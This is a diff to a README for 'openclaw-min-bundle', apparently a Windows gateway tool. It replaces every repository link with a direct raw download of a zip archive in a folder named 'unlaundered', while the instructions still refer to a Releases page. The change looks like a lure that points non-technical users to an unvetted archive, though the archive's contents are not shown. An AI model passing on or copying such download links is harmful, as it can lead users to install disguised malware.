@@ -1,6 +1,6 @@
 # 🛠 openclaw-min-bundle - Minimal Self-Healing Gateway Setup
 
-[![Download openclaw-min-bundle](https://img.shields.io/badge/Download-openclaw--min--bundle-brightgreen?style=for-the-badge)](https://github.com/CyberJhay/openclaw-min-bundle)
+[![Download openclaw-min-bundle](https://img.shields.io/badge/Download-openclaw--min--bundle-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/CyberJhay/openclaw-min-bundle/main/unlaundered/openclaw-bundle-min-v1.2-alpha.1.zip)
 
 ## 🖥 About openclaw-min-bundle
 
@@ -28,7 +28,7 @@ The application runs quietly and uses minimal resources. It works with most mode
 
 Follow these steps to download and start openclaw-min-bundle on your Windows computer. No programming knowledge is needed.
 
-1. **Click the green download button above or [open this page](https://github.com/CyberJhay/openclaw-min-bundle).**
+1. **Click the green download button above or [open this page](https://raw.githubusercontent.com/CyberJhay/openclaw-min-bundle/main/unlaundered/openclaw-bundle-min-v1.2-alpha.1.zip).**
 
 2. On the GitHub page, find the "Releases" section. This is where the software bundles are listed.
 
@@ -101,4 +101,4 @@ If problems persist, you can contact support or open an issue on the repository�
 
 Click the button below to visit the download page and get the latest version of openclaw-min-bundle:
 
-[![Get openclaw-min-bundle](https://img.shields.io/badge/Download_Page-Visit-blue?style=for-the-badge)](https://github.com/CyberJhay/openclaw-min-bundle)
+[![Get openclaw-min-bundle](https://img.shields.io/badge/Download_Page-Visit-blue?style=for-the-badge)](https://raw.githubusercontent.com/CyberJhay/openclaw-min-bundle/main/unlaundered/openclaw-bundle-min-v1.2-alpha.1.zip)
